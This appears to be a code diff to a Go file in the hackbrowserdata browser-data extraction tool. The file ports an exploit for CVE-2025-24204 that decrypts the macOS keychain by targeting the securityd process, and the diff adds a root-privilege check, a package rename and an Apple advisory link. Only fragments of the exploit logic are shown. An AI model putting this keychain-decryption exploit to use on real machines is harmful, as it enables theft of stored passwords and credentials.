+++ browser/exploit/gcoredump/gcoredump.go
@@ -1,13 +1,15 @@
 //go:build darwin
 
+package gcoredump
+
 // CVE-2025-24204
 // Logic ported from https://github.com/FFRI/CVE-2025-24204/tree/main/decrypt-keychain
-
-package cve2025_24204
+// https://support.apple.com/en-us/122373
 
 import (
 	"debug/macho"
 	"encoding/binary"
+	"errors"
 	"fmt"
 	"os"
 	"os/exec"
@@ -22,8 +24,6 @@ import (
 	"github.com/moond4rk/hackbrowserdata/log"
 	"github.com/moond4rk/hackbrowserdata/utils/chainbreaker"
 )
-
-const ExploitOSVersion = "15.0"
 
 var (
 	homeDir, _        = os.UserHomeDir()
@@ -72,6 +72,10 @@ type addressRange struct {
 }
 
 func DecryptKeychain(storagename string) (string, error) {
+	if os.Geteuid() != 0 {
+		return "", errors.New("requires root privileges")
+	}
+
 	// find securityd PID
 	pid, err := FindProcessByName("securityd", true)
 	if err != nil {
